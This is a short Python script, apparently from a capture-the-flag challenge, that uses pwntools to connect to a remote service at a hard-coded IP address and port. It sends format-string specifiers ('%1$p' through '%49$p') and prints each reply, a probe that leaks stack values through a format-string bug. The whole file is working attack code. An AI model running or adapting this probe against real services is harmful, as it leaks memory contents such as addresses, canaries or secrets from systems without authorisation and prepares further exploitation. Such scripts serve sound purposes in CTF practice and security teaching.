
from pwn import *


io = remote("35.228.220.66",1301)
for i in range(1,50):
    io.sendlineafter(":",f"%{i}$p")
    io.recvline()
    print("this one: ",i,io.recvline())
    